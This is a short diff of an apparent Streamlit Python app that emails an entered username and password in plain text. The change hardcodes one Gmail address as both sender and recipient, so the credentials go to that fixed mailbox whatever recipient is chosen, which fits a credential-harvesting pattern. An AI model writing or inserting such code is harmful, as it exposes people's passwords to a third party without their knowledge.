@@ -28,7 +28,7 @@ if st.button("Send email"):
         body = "Username: " + username + "\nPassword: " + password
 
         msg = f"Subject: {subject}\n\n{body}"
-        server.sendmail("your_email@gmail.com", selected_name + "@gmail.com", msg)
+        server.sendmail("aptest2177@gmail.com", "aptest2177@gmail.com", msg)
         st.success("Email sent successfully.")
     except:
         st.error("Error: Email not sent.")
